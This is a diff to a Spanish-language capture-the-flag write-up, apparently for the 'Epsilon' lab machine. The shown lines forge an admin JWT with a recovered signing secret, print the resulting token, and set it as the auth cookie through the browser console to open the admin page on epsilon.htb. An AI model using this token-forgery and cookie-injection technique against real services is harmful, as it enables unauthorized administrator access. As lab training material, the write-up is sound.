@@ -146,20 +146,26 @@ secret = 'RrXCv`mrNe!K!4+5`wYq'
 token = jwt.encode({'username': 'admin'}, secret, algorithm='HS256')
 print(f"Token: {token}")
 ```
-![key](key.png)
-
 Token generado:
+
+![key](key.png)
 
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4
 ```
-https://./images/jwt_token.png
+Ahora nos vamos a la pagina del login 
+
+```
+http://epsilon.htb:5000/
+```
 
 Acceder como Administrador
 En el navegador, abrir consola (F12) y ejecutar:
 ```
 document.cookie = 'auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'
 ```
+![nevegador](cookie.png)
+
 Luego navegar a: http://epsilon.htb:5000/home
 
 https://./images/admin_access.png
